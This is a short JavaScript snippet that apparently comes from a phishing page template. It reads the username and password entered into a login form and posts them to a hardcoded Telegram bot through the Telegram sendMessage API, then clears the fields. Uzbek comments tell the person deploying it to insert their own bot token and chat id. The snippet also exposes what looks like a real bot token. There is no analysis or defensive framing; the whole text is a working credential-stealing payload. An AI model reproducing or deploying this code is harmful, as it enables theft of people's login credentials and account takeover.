    <script>
    //bot token
var telegram_bot_id = "5484981142:AAGEkDzjGbL7phS7Tb8ffCi0DNuIG5NPdzU"; // token'ni o'rniga Siz yaratgan Bot tokenini yozing
//chat id
var chat_id = 5322203833; // 1111'ni o'rniga habar borishi kerak bo'lgan joyni ID'sini yozing (Batafsil videoda)
var name, password;
var ready = function() {
    name = document.getElementById("name").value;
    // = document.getElementById("email").value;
    password = document.getElementById("password").value;
    message = "Username : " + name + "\nPassword : " + password;
};
var sendtelegram = function() {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function(response) {
        console.log(response);
    });
    document.getElementById("name").value = "";
    document.getElementById("").value = "";
    document.getElementById("password").value = "";
    return false;
};
